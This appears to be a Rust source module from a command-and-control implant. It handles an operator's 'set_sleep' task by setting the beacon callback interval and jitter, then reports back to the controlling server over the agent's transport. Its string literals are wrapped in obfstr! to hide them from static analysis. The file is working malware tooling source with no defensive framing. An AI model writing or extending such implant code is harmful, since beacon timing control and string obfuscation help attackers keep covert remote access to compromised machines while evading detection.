use obfstr::obfstr;
use crate::config;
use crate::transport;

pub fn set_sleep(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let task_id = task.get("id").and_then(|v| v.as_str()).unwrap_or("");
    let params_raw = task.get("parameters").and_then(|v| v.as_str()).unwrap_or("{}");
    let params: serde_json::Value = serde_json::from_str(params_raw).unwrap_or(serde_json::json!({}));

    let interval = params
        .get("interval")
        .and_then(|v| v.as_u64())
        .ok_or("missing interval parameter")?;
    let jitter = params
        .get("jitter")
        .and_then(|v| v.as_u64())
        .unwrap_or(0);

    if jitter > 100 {
        return Err("jitter must be 0-100".into());
    }

    *config::callback_interval.write().unwrap() = interval;
    *config::callback_jitter.write().unwrap() = jitter;

    crate::dlog!("sleep: interval={interval}s jitter={jitter}%");

    let sleep_info = format!("{}s jitter {}%", interval, jitter);
    let response = serde_json::json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [{
            obfstr!("task_id"): task_id,
            obfstr!("completed"): true,
            obfstr!("user_output"): format!("Sleep updated: {}s jitter {}%", interval, jitter),
            obfstr!("sleep_info"): sleep_info,
        }]
    });
    transport::send_request(&serde_json::to_string(&response)?)?;
    Ok(())
}
